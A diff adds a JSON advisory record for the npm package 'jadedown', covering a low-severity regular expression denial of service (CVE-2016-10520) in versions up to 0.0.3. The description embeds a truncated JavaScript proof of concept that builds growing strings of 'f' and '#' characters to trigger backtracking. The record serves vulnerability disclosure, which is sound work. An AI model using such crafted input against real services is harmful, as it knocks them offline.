@@ -1,0 +1,32 @@
+{
+  "packageName": "jadedown",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-6354-6mhv-mvv5",
+      "packageName": "jadedown",
+      "title": "Regular Expression Denial of Service in jadedown",
+      "description": "The `jadedown` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in.\n\n\n### Proof of concept\n```js\nvar jadedown = require('jadedown');\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=1;i<=10000000;i=i+1) {\n    console.log(\"COUNT: \" + i);\n    var str = genstr(i, 'f') + genstr(i, '#') + '{';\n    console.log(\"LENGTH: \" + str.l",
+      "severity": "low",
+      "url": "https://github.com/advisories/GHSA-6354-6mhv-mvv5",
+      "publishedAt": "2019-02-18T23:38:38Z",
+      "modifiedAt": "2023-09-11T22:25:26Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-6354-6mhv-mvv5"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2016-10520"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": "<= 0.0.3"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
